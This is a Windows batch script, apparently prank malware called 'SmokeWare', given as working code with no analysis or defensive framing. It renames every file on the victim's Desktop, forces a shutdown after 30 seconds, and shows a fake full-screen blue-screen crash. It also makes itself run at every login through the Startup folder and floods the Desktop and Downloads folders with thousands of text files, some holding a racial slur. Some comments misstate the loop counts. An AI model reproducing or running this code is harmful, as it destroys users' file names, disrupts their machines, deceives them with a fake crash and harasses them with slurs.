@echo off
setlocal enabledelayedexpansion

:: Set Desktop path
set "desktop=%USERPROFILE%\Desktop"

:: Change to Desktop directory
cd /d "%desktop%"

:: Initialize counter
set /a count=1

:: Loop through files only (not folders)
for %%F in (*.*) do (
    ren "%%F" "TheRedCoatsWereHere_!count!%%~xF"
    set /a count+=1
)

shutdown /s /t 30



@echo off
powershell -NoProfile -Command ^
  "Add-Type -AssemblyName PresentationFramework;" ^
  "$ws = New-Object System.Windows.Window;" ^
  "$ws.WindowStyle = 'None';" ^
  "$ws.WindowState = 'Maximized';" ^
  "$ws.Topmost = $true;" ^
  "$ws.Background = [System.Windows.Media.Brushes]::Blue;" ^
  "$tb = New-Object System.Windows.Controls.TextBlock;" ^
  "$tb.Text = 'A problem has been detected and Windows has been shut down to prevent damage to your computer.`n`n*** STOP: 0x0000007B (0xFFFFF880009A97E8, 0xFFFFFFFFC0000034, 0x0000000000000000, 0x0000000000000000)`n`nCollecting data for crash dump ...`nInitializing disk for crash dump ...`nContact your system administrator or technical support group for further assistance.';" ^
  "$tb.FontFamily = 'Consolas';" ^
  "$tb.FontSize = 18;" ^
  "$tb.Foreground = [System.Windows.Media.Brushes]::White;" ^
  "$tb.TextWrapping = 'Wrap';" ^
  "$tb.Margin = '20';" ^
  "$ws.Content = $tb;" ^
  "$ws.ShowDialog();"

setlocal

:: Full path to your SmokeWare.bat (assuming this script is in the same folder)
set "BatchFilePath=%~dp0SmokeWare.bat"

:: User Startup folder path
set "StartupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Shortcut file name
set "ShortcutName=SmokeWare.lnk"

:: Create shortcut using PowerShell
powershell -Command ^
  "$WshShell = New-Object -ComObject WScript.Shell; " ^
  "$Shortcut = $WshShell.CreateShortcut('%StartupFolder%\%ShortcutName%'); " ^
  "$Shortcut.TargetPath = '%BatchFilePath%'; " ^
  "$Shortcut.WorkingDirectory = '%~dp0'; " ^
  "$Shortcut.Save()"

echo Shortcut created for SmokeWare in Startup folder.
pause



setlocal

REM Path to Desktop
set "desktopPath=%USERPROFILE%\Desktop"

REM Create 50 text files with the message
for /l %%i in (1,1,5000) do (
    echo Might as well factory reset nigga.. > "%desktopPath%\TheRedCoatsWereHere_%%i.txt"
)



setlocal enabledelayedexpansion

:: Get the current user's Downloads folder path
set "downloads=%USERPROFILE%\Downloads"

:: Create 500 files named TheRedCoatsWillRule1.txt ... TheRedCoatsWillRule500.txt
for /l %%i in (1,1,5000) do (
    echo The Red Coats will rule forever. > "%downloads%\TheRedCoatsWillRule%%i.txt"
)